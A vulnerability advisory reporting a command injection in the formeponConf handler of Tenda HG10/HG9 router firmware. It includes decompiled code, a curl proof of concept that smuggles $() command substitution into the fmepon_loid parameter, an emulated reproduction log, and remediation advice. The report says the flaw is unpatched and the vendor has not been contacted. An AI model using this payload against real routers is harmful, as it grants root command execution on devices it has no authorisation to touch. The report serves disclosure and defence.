# Tenda HG10/HG9 V3.3.0-250113 was discovered to contain a command injection vulnerability in formeponConf

## Overview

- Vendor: Tenda
- Product: HG10/HG9 (HG7_HG9_HG10 family)
- Version: V3.3.0-250113
- Component: Boa formeponConf
- Vulnerability Class: CWE-78 command injection
- Manufacturer: https://www.tendacn.com/

## Affected version

- Package `HG7_HG9_HG10re_300001138.zip`.
- `boa`.
- Sample ID: `tenda-000069`.

## Vulnerability details

`formeponConf` reads `fmepon_loid` and `fmepon_loid_password` and places both
inside a double-quoted `oamcli` command:

```c
Var = boaGetVar(a1, "fmepon_loid", "");
v4  = boaGetVar(a1, "fmepon_loid_password", "");
mib_set(256, Var);
mib_set(257, v4);
Commit();
rtk_epon_llidEntryNum_get(&v13);
while ( v6 < v13 ) {
    sprintf(v11, "/bin/oamcli set ctc loid %d \"%s\" \"%s\"", v6, Var, v4);
    system(v11);
    ...
}
```

Double quotes do not prevent `$()` or backtick command substitution. No
character filtering is applied. The endpoint requires an admin session;
Tenda Boa has no CSRF token, so an admin-CSRF vector is plausible.

## PoC

```sh
curl -G \
  --data-urlencode 'fmepon_loid=$(echo EPON_PWNED>/dev/console)' \
  --data-urlencode 'fmepon_loid_password=x' \
  http://<router>/boaform/formeponConf
```

## Reproduction and terminal evidence

Environment: FirmAE full-system HG10/HG9 image; only `auth_authorize` was
patched to return 1 to reach the handler. `formeponConf` and `system` are the
vendor binary's. Boa listens on 80/443/18182.

Request and serial transcript:

```
curl -G --data-urlencode 'fmepon_loid=$(echo EPON_PWNED>/dev/console)' \
  --data-urlencode 'fmepon_loid_password=x' \
  http://127.0.0.1:8083/boaform/formeponConf
HTTP/1.0 200 OK   (378-byte normal page)
...
EPON_PWNED
EPON_PWNED
```

The marker appears on `/dev/console` because the command substitution is
evaluated by the shell inside `system()`. Evidence log:
`evidence/dynamic-epon-injection.log` in the parent project.

## Static evidence

The decompiled handler and the `sprintf(..., "/bin/oamcli set ctc loid %d \"%s\" \"%s\"", ...)` + `system(v11)` call are in
`evidence/ida-formeponConf.txt` (parent project). No length or character
filter sits between `boaGetVar` and the format string.

## Impact

Authenticated admin (or CSRF against an admin browser) obtains root command
execution. EPON hardware state can affect the loop, but the injection occurs
inside the loop body and does not require a valid LOID.

## Remediation

- Strictly allow-list/escape `fmepon_loid` and `fmepon_loid_password`.
- Use `execve`/argv for `oamcli` instead of a shell command line.
- Add per-session CSRF tokens to state-changing Boa handlers.

## Known CVE relation

- CVE-2026-86167 covers Tenda HG10 `formgponConf` (`fmgpon_loid`), a GPON
  handler. This report is the EPON `formeponConf` handler; NVD keyword
  `formeponConf` returns 0 records (2026-11-06). Vendor should confirm whether
  it treats the two as the same issue.

## Status and disclosure

Dynamic confirmation (FirmAE, auth-bypass test image; handler/system
unchanged). Candidate 0-day; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
HG10/HG9 (HG7_HG9_HG10 family)

### Version or Commit
V3.3.0-250113

### Vulnerability Class
CWE-78 command injection

### Description
formeponConf places fmepon_loid and fmepon_loid_password inside a double-quoted oamcli command without escaping, allowing command injection.

### Affected_component
Boa formeponConf

### Attack_vector
Authenticated POST to /goform/formeponConf with crafted fmepon_loid / fmepon_loid_password.

### Product_version
HG10/HG9 (HG7_HG9_HG10 family) V3.3.0-250113

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/HG10_HG9_V3.3.0-250113/report-4.md
```
